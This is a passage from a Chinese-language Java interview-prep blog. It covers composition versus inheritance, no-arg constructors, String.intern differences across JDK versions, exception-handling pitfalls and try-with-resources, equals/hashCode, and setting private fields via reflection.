<h3 id="如何选择"><a href="#如何选择" class="headerlink" title="如何选择"></a>如何选择</h3><p>相信很多人都知道面向对象中有一个比较重要的原则『多用组合、少用继承』或者说『组合优于继承』。从前面的介绍已经优缺点对比中也可以看出，组合确实比继承更加灵活，也更有助于代码维护。</p>
<p><strong>所以，建议在同样可行的情况下，优先使用组合而不是继承。因为组合更安全，更简单，更灵活，更高效。</strong></p>
<hr>
<p>注意，并不是说继承就一点用都没有了，前面说的是【在同样可行的情况下】。有一些场景还是需要使用继承的，或者是更适合使用继承。</p>
<blockquote>
<p>继承要慎用，其使用场合仅限于你确信使用该技术有效的情况。一个判断方法是，问一问自己是否需要从新类向基类进行向上转型。如果是必须的，则继承是必要的。反之则应该好好考虑是否需要继承。《Java编程思想》</p>
</blockquote>
<blockquote>
<p>只有当子类真正是超类的子类型时，才适合用继承。换句话说，对于两个类A和B，只有当两者之间确实存在is-a关系的时候，类B才应该继承类A。《Effective Java》</p>
</blockquote>
<h1 id="✅为什么建议自定义一个无参构造函数"><a href="#✅为什么建议自定义一个无参构造函数" class="headerlink" title="✅为什么建议自定义一个无参构造函数"></a>✅为什么建议自定义一个无参构造函数</h1><h2 id="典型回答-22"><a href="#典型回答-22" class="headerlink" title="典型回答"></a>典型回答</h2><p>Java中的构造函数分为无参和有参。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    // 无参构造器</span><br><span class="line">    public Person() &#123;</span><br><span class="line">        this.name = &quot;Unknown&quot;;</span><br><span class="line">        this.age = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 有参构造器</span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ...其他方法...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>不管有参还是无参，都是为了做对象的初始化的。无参的就是给对象的成员变量设置默认值。有参的就是根据我们的参数进行初始化。</p>
<p>如果没有显示定义任何构造函数，会自动添加一个无参构造函数。但是如果已经定义过构造函数，那么就不会默认添加了。</p>
<p><strong>定义一个无参构造函数（也称为默认构造器）通常被认为是Java编程中的一种好习惯，虽然如果我们没定义，JDK会帮我自动生成一个，但是如果我们自己定义了一个有参的构造函数，那么就不会自动帮我们生成无参构造函数了，而没有无参构造函数会带来一系列问题</strong>：</p>
<p><strong>1.反射及序列化要求</strong></p>
<p>在使用Java反射或者序列化&#x2F;反序列化时，经常是调用类的无参构造函数进行对象创建的。</p>
<hr>
<p><strong>2. 兼容性和可扩展性</strong></p>
<hr>
<p>许多Java框架和库，如Spring、Hibernate、Jackson等，在进行对象的创建和初始化时，依赖于类的无参构造器。如果没有定义无参构造器，这些框架可能无法正常工作。</p>
<p><strong>3. JavaBean规范</strong></p>
<p>根据JavaBean规范，一个标准的JavaBean必须拥有一个公共的无参构造器。这使得JavaBean可以被实例化，并且其属性可以通过反射机制被外部访问和修改。</p>
<p><strong>4. 子类构造器的默认行为</strong></p>
<p>在Java中，子类构造器默认会调用父类的无参构造器。如果父类没有定义无参构造器，而子类又没有显式调用父类的其他构造器，这将导致编译错误。</p>
<h1 id="✅为什么这段代码在JDK不同版本中结果不同"><a href="#✅为什么这段代码在JDK不同版本中结果不同" class="headerlink" title="✅为什么这段代码在JDK不同版本中结果不同"></a>✅为什么这段代码在JDK不同版本中结果不同</h1><h2 id="典型回答-23"><a href="#典型回答-23" class="headerlink" title="典型回答"></a>典型回答</h2><p>（本文并不算一道面试题，因为面试的时候很少有人问，但是这个对于理解intern的原理是比较有帮助的，所以就写了。然后有人反馈自己代码执行和我文中的不一样，可能的原因有很多，比如JDK版本不同、操作系统不同、本地编译过的其他代码也有影响等。故而如果现象不一致，可以使用一些在线的Java代码执行工具测试，如：<a target="_blank" rel="noopener" href="https://www.bejson.com/runcode/java/">https://www.bejson.com/runcode/java/</a> 。）</p>
<p>以下代码中，在JDK 1.8中，JDK 11及以上版本中执行后结果不是一样的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s3 = new String(&quot;1&quot;) + new String(&quot;1&quot;);</span><br><span class="line">s3.intern();</span><br><span class="line">String s4 = &quot;11&quot;;</span><br><span class="line">System.out.println(s3 == s4);</span><br></pre></td></tr></table></figure>



<p>你会发现，在JDK 1.8中，以上代码得到的结果是true，而JDK 11及以上的版本中结果却是false。</p>
<p>那么，再稍作修改呢？在目前的所有JDK版本中，执行以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s3 = new String(&quot;3&quot;) + new String(&quot;3&quot;);// ①</span><br><span class="line">s3.intern();// ②</span><br><span class="line">String s4 = &quot;33&quot;;</span><br><span class="line">System.out.println(s3 == s4);// ③</span><br></pre></td></tr></table></figure>



<p>得到的结果也是true，你知道为什么嘛？</p>
<p>看这篇文章之前，请先阅读以下文章，先确保自己了解了intern的原理！！！</p>
<p>出现上述现象，肯定是因为在JDK 11 及以上的版本中，”11”这个字面量已经被提前存入字符串池了。那什么时候存进去的呢？（这个问题，全网应该没人提过）</p>
<p>经过我七七四十九天的研究，终于发现了端倪，就在以下代码中：<a target="_blank" rel="noopener" href="https://github.com/zxiaofan/JDK/blob/19a6c71e52f3ecd74e4a66be5d0d552ce7175531/jdk-11.0.2/src/jdk.compiler/com/sun/tools/javac/code/Source.java">Source.java</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public enum Source &#123;</span><br><span class="line">    /** 1.0 had no inner classes, and so could not pass the JCK. */</span><br><span class="line">    // public static final Source JDK1_0 =              new Source(&quot;1.0&quot;);</span><br><span class="line"></span><br><span class="line">    /** 1.1 did not have strictfp, and so could not pass the JCK. */</span><br><span class="line">    // public static final Source JDK1_1 =              new Source(&quot;1.1&quot;);</span><br><span class="line"></span><br><span class="line">    /** 1.2 introduced strictfp. */</span><br><span class="line">    JDK1_2(&quot;1.2&quot;),</span><br><span class="line"></span><br><span class="line">    /** 1.3 is the same language as 1.2. */</span><br><span class="line">    JDK1_3(&quot;1.3&quot;),</span><br><span class="line"></span><br><span class="line">    /** 1.4 introduced assert. */</span><br><span class="line">    JDK1_4(&quot;1.4&quot;),</span><br><span class="line"></span><br><span class="line">    /** 1.5 introduced generics, attributes, foreach, boxing, static import,</span><br><span class="line">     *  covariant return, enums, varargs, et al. */</span><br><span class="line">    JDK5(&quot;5&quot;),</span><br><span class="line"></span><br><span class="line">    /** 1.6 reports encoding problems as errors instead of warnings. */</span><br><span class="line">    JDK6(&quot;6&quot;),</span><br><span class="line"></span><br><span class="line">    /** 1.7 introduced try-with-resources, multi-catch, string switch, etc. */</span><br><span class="line">    JDK7(&quot;7&quot;),</span><br><span class="line"></span><br><span class="line">    /** 1.8 lambda expressions and default methods. */</span><br><span class="line">    JDK8(&quot;8&quot;),</span><br><span class="line"></span><br><span class="line">    /** 1.9 modularity. */</span><br><span class="line">    JDK9(&quot;9&quot;),</span><br><span class="line"></span><br><span class="line">    /** 1.10 local-variable type inference (var). */</span><br><span class="line">    JDK10(&quot;10&quot;),</span><br><span class="line"></span><br><span class="line">    /** 1.11 covers the to be determined language features that will be added in JDK 11. */</span><br><span class="line">    JDK11(&quot;11&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看到了么，xdm，在JDK 11 的源码中，定义了”11”这个字面量，那么他会提前进入到字符串池中，那么后续的intern的过程就会直接从字符串池中获取到这个字符串引用。</p>
<p>按照这个思路，大家可以在JDK 11中执行以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String s3 = new String(&quot;1&quot;) + new String(&quot;1&quot;);</span><br><span class="line">s3.intern();</span><br><span class="line">String s4 = &quot;11&quot;;</span><br><span class="line">System.out.println(s3 == s4);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">String s3 = new String(&quot;1&quot;) + new String(&quot;2&quot;);</span><br><span class="line">s3.intern();</span><br><span class="line">String s4 = &quot;12&quot;;</span><br><span class="line">System.out.println(s3 == s4);</span><br></pre></td></tr></table></figure>



<p>得到的结果就是false和true。</p>
<p>或者我是在JDK 21中分别执行了以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String s3 = new String(&quot;2&quot;) + new String(&quot;1&quot;);</span><br><span class="line">s3.intern();</span><br><span class="line">String s4 = &quot;21&quot;;</span><br><span class="line">System.out.println(s3 == s4);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">String s3 = new String(&quot;2&quot;) + new String(&quot;2&quot;);</span><br><span class="line">s3.intern();</span><br><span class="line">String s4 = &quot;22&quot;;</span><br><span class="line">System.out.println(s3 == s4);</span><br></pre></td></tr></table></figure>



<p>得到的结果就也是false和true。</p>
<h1 id="✅现在JDK的最新版本是什么？"><a href="#✅现在JDK的最新版本是什么？" class="headerlink" title="✅现在JDK的最新版本是什么？"></a>✅现在JDK的最新版本是什么？</h1><h2 id="典型回答-24"><a href="#典型回答-24" class="headerlink" title="典型回答"></a>典型回答</h2><p>目前<strong>Java的发布周期是每半年发布一次</strong>，<strong>大概在每年的3月份和9月份都会发布新版本</strong>。</p>
<p>~~<strong>在2023年9月份的时候发布了JDK 21</strong>~~~~。 ~~ </p>
<hr>
<p><strong>2024年3月19日，JDK22正式发布</strong>。根据正常的发布节奏，接下来的发布情况应该是：</p>
<p>2024-09 ——&gt; JDK 23</p>
<p>2025-03 ——&gt; JDK 24</p>
<p>2025-09 ——&gt; JDK 25</p>
<p>2026-03 ——&gt; JDK 26</p>
<p>在JDK 22及之前的版本中，最后一个LTS版本（Long Term Support）是JDK 21。</p>
<h1 id="✅以下关于异常处理的代码有哪些问题"><a href="#✅以下关于异常处理的代码有哪些问题" class="headerlink" title="✅以下关于异常处理的代码有哪些问题"></a>✅以下关于异常处理的代码有哪些问题</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException, RuntimeException&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Not able to Start&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String line;</span><br><span class="line">        br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;\home\usr\test.java&quot;</span>));</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        ex.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        re.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 是否会输出？</span></span><br><span class="line">        System.out.print(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="典型回答-25"><a href="#典型回答-25" class="headerlink" title="典型回答"></a>典型回答</h2><ol>
<li><code>#start</code>方法不会发生IOException，所以不需要throws</li>
<li>RuntimeExcption不需要显式的throws</li>
<li>catch的时候，要先从子类开始catch，代码中catch的顺序不对</li>
<li>没有关闭流</li>
<li>return之前的finally block是会被执行的</li>
</ol>
<h2 id="知识扩展-5"><a href="#知识扩展-5" class="headerlink" title="知识扩展"></a>知识扩展</h2><h2 id="上述代码，如何优化"><a href="#上述代码，如何优化" class="headerlink" title="上述代码，如何优化"></a>上述代码，如何优化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String... args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;\home\usr\test.java&quot;</span>))) &#123;</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// handle exception</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="try-with-resource的原理"><a href="#try-with-resource的原理" class="headerlink" title="try-with-resource的原理"></a>try-with-resource的原理</h2><p>javac使用了语法糖进行优化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">    BufferedReader br;</span><br><span class="line">    Throwable throwable;</span><br><span class="line">    br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;\home\usr\test.java&quot;</span>));</span><br><span class="line">    throwable = <span class="literal">null</span>;</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>((line = br.readLine()) != <span class="literal">null</span>)</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable throwable2) &#123;</span><br><span class="line">        throwable = throwable2;</span><br><span class="line">        <span class="keyword">throw</span> throwable2;</span><br><span class="line">    &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(br != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">if</span>(throwable != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	br.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable throwable1) &#123;</span><br><span class="line">        	throwable.addSuppressed(throwable1);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	br.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java7中还对异常做了哪些优化？"><a href="#Java7中还对异常做了哪些优化？" class="headerlink" title="Java7中还对异常做了哪些优化？"></a>Java7中还对异常做了哪些优化？</h2><ol>
<li>Multi-Catch Exceptions，可以连续处理多个异常，如：</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleExceptionHandlingNew</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://www.yoursimpledate.server/&quot;</span>);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(url.openStream()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">format</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;MM/DD/YY&quot;</span>);</span><br><span class="line">        <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> format.parse(line);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(ParseException | IOException exception) &#123;</span><br><span class="line">        <span class="comment">// handle our problems here.</span></span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Rethrowing Exceptions</li>
<li>Suppressed Exceptions</li>
<li><a target="_blank" rel="noopener" href="https://www.oracle.com/technical-resources/articles/java/java7exceptions.html">参考网址</a></li>
</ol>
<h2 id="Java中异常的处理方式有哪几种？一般如何选择。"><a href="#Java中异常的处理方式有哪几种？一般如何选择。" class="headerlink" title="Java中异常的处理方式有哪几种？一般如何选择。"></a>Java中异常的处理方式有哪几种？一般如何选择。</h2><p>异常的处理方式有两种。1、自己处理。2、向上抛，交给调用者处理。</p>
<p>异常，千万不能捕获了之后什么也不做。或者只是使用e.printStacktrace。</p>
<p>具体的处理方式的选择其实原则比较简明：自己明确的知道如何处理的，就要处理掉。不知道如何处理的，就交给调用者处理  </p>
<h1 id="✅有了equals为啥需要hashCode方法？"><a href="#✅有了equals为啥需要hashCode方法？" class="headerlink" title="✅有了equals为啥需要hashCode方法？"></a>✅有了equals为啥需要hashCode方法？</h1><h2 id="典型回答-26"><a href="#典型回答-26" class="headerlink" title="典型回答"></a>典型回答</h2><p>在Java中，equals()和hashCode()方法通常是成对的，它们在使用基于Hash机制的数据结构时非常重要，例如HashMap、HashSet和Hashtable等。</p>
<ul>
<li>equals()：用于判断两个对象是否相等</li>
<li>hashCode：生成对象的哈希码，返回值是一个整数，用于确定对象在哈希表中的位置。</li>
</ul>
<p>为什么需要hashCode，主要是为了方便用在Hash结构的数据结构中，因为对于这种数据结构来说，想要把一个对象存进去，需要定位到他应该存放在哪个桶中，而这个桶的位置，就需要通过一个整数来获取，然后再对桶的长度取模（实际hashmap要比这复杂一些</p>
<p>那么，怎么能快速获取一个和这个对象有关的整数呢，那就是hashCode方法了。所以，hashCode的结果是和对象的内容息息相关的。那么也就意味着<strong>如果两个对象通过equals()方法比较是相等的，那么它们的hashCode()方法必须返回相同的整数值。</strong></p>
<p>那么，在一个对象中，定义了equals方法之后，同时还需要定义hashCode方法， 因为这样在向hashMap、hashTable等中存放的时候，才能快速的定位到位置。</p>
<p>所以，基于两方面考虑，<strong>一方面是效率，hashCode() 方法提供了一种快速计算对象哈希值的方式，这些哈希值用于确定对象在哈希表中的位置。这意味着可以快速定位到对象应该存储在哪个位置或者从哪个位置检索，显著提高了查找效率。</strong></p>
<hr>
<p>**另外一方面是可以和equals做协同来保证数据的一致性和准确性。**根据 Java 的规范，如果两个对象通过 equals() 方法比较时是相等的，那么这两个对象的 hashCode() 方法必须返回相同的整数值。如果违反了这一规则，将导致哈希表等数据结构无法正确地处理对象，从而导致数据丢失和检索失败。</p>
<hr>
<hr>
<h1 id="✅怎么修改一个类中的private修饰的String参数的值"><a href="#✅怎么修改一个类中的private修饰的String参数的值" class="headerlink" title="✅怎么修改一个类中的private修饰的String参数的值"></a>✅怎么修改一个类中的private修饰的String参数的值</h1><h2 id="典型回答-27"><a href="#典型回答-27" class="headerlink" title="典型回答"></a>典型回答</h2><p>这个问题，要么面试官是想问你反射，要么就是在给你挖坑！</p>
<p>因为，<strong>在Java中，String 类型确实是不可变的。这意味着一旦一个 String 对象被创建，其内容就不能被改变。任何看似修改了 String 值的操作实际上都是创建了一个新的 String 对象。</strong></p>
<hr>
<p>当然，如果不考虑这个可不可变的问题，新建一个也算改了的话。那么就有以下几种方式：</p>
<p>1、在Java中，<code>private</code> 访问修饰符限制了只有类本身可以访问和修改其成员变量。如果需要在类的外部修改一个 <code>private</code> 修饰的 <code>String</code> 参数，通常有几种方法：</p>
<h3 id="1-使用-Setter-方法"><a href="#1-使用-Setter-方法" class="headerlink" title="1. 使用 Setter 方法"></a>1. 使用 Setter 方法</h3><p>这是最常用且最符合对象导向设计原则的方法。在类内部提供一个公开的 <code>setter</code> 方法来修改 <code>private</code> 变量的值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String myString;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMyString</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myString = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">obj.setMyString(<span class="string">&quot;new value&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="2-使用反射"><a href="#2-使用反射" class="headerlink" title="2. 使用反射"></a>2. 使用反射</h3><p>如果没有 <code>setter</code> 方法可用，可以使用反射。这种方法可以突破正常的访问控制规则，但应谨慎使用，因为它破坏了封装性，增加了代码的复杂性和出错的可能性。并且性能并不好。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">myString</span> <span class="operator">=</span> <span class="string">&quot;initial value&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用反射修改</span></span><br><span class="line"><span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> MyClass.class.getDeclaredField(<span class="string">&quot;myString&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>); <span class="comment">// 使得private字段可访问</span></span><br><span class="line">    field.set(obj, <span class="string">&quot;new value&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="✅字符串常量是什么时候进入到字符串常量池的？"><a href="#✅字符串常量是什么时候进入到字符串常量池的？" class="headerlink" title="✅字符串常量是什么时候进入到字符串常量池的？"></a>✅字符串常量是什么时候进入到字符串常量池的？</h1><h2 id="典型回答-28"><a href="#典型回答-28" class="headerlink" title="典型回答"></a>典型回答</h2><p>字符串常量池中的常量有两种来源，一种是字面量会在编译期先进入到Class常量池，然后再在运行期进去到字符串池，还有一种就是在运行期通过intern将字符串对象手动添加到字符串常量池中。</p>
<p>那么，Class常量池中的常量，是在什么时候被放进到字符串池的呢？</p>
<p>Java 的类加载过程要经历加载（Loading）、链接（Linking）、初始化（Initializing）等几个步骤，在链接这个步骤，又分为验证（Verification）、准备（Preparation）以及解析（Resolution）等几个步骤。</p>
<p>在 Java 虚拟机规范及 Java语言规范中都提到过：</p>
<blockquote>
<p>《The Java Virtual Machine Specification》 5.4 Linking：</p>
<p>For example, a Java Virtual Machine implementation may choose to resolve each symbolic reference in a class or interface individually when it is used (“lazy” or “late” resolution), or to resolve them all at once when the class is being verified (“eager” or “static” resolution)</p>
<p>《The Java Language Specification》 12.3 Linking of Classes and Interfaces</p>
<p>For example, an implementation may choose to resolve each symbolic reference in a class or interface individually, only when it is used (lazy or late resolution), or to resolve them all at once while the class is being verified (static resolution). This means that the resolution process may continue, in some implementations, after a class or interface has been initialized.</p>
</blockquote>
<p>大致意思差不多，就是说，Java 虚拟机的实现可以选择只有在用到类或者接口中的符号引用时才去逐一解析他（延迟解析），或者在验证类的时候就解析每个引用（预先解析）。这意味着在一些虚拟机实现中，把常量放到常量池的步骤可能是<strong>延迟处理</strong>的。</p>
<p>对于 HotSpot 虚拟机来说，字符串字面量，和其他基本类型的常量不同，并不会在类加载中的解析阶段填充并驻留在字符串常量池中，而是以特殊的形式存储在运行时常量池中。<strong>只有当这个字符串字面量被调用时，才会对其进行解析，开始为他在字符串常量池中创建对应的 String 实例。</strong></p>
<p>通过查看 HotSpot JDK 1.8 的 ldc 指令的源代码，也可以验证上面的说法。</p>
<blockquote>
<p>ldc 指令表示int、float或String型常量从常量池推送至栈顶</p>
</blockquote>
